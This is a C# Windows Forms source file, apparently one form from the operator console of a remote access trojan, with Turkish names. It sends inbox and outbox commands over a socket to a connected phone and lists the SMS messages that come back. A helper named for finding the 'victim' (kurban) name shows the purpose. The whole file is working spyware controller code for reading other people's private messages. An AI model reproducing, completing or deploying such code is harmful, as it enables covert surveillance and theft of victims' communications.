using System;
using System.Net.Sockets;
using System.Windows.Forms;

namespace SV
{
    public partial class SMSYoneticisi : Form
    {
        public string uniq_id = "";
        Socket sck;
        public SMSYoneticisi(Socket sock, string id)
        {
            InitializeComponent();
            sck = sock;
            uniq_id = id;
        }
        public void bilgileriIsle(string arg)
        {
            listView1.Items.Clear();
            if (arg != "SMS YOK")
            {
                string[] ana_Veriler = arg.Split('&');
                for (int k = 0; k < ana_Veriler.Length; k++)
                {
                    try
                    {
                        string[] bilgiler = ana_Veriler[k].Split('{');
                        ListViewItem item = new ListViewItem(bilgiler[0]);
                        item.ImageIndex = 0;
                        item.SubItems.Add(bilgiler[4]);
                        item.SubItems.Add(bilgiler[1]);
                        item.SubItems.Add(bilgiler[2]);
                        item.SubItems.Add(bilgiler[3]);
                        listView1.Items.Add(item);
                    }
                    catch (Exception) { }
                }
            }
            else
            {
                ListViewItem item = new ListViewItem("There is no SMS");
                listView1.Items.Add(item);
            }
        }
        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    listView1.SelectedItems[0].ImageIndex = 1;
                    new Goruntule(listView1.SelectedItems[0].SubItems[1].Text,
                        listView1.SelectedItems[0].SubItems[2].Text).Show();
                }
                catch (Exception) { }
            }
        }

        private void gelenSMSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("GELENKUTUSU", "[VERI][0x09]", sck);
                ((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(sck.Handle.ToString());
            }
            catch (Exception) { }
        }

        private void gidenSMSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("GIDENKUTUSU", "[VERI][0x09]", sck);
                ((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(sck.Handle.ToString());
            }
            catch (Exception) { }
        }
    }
}
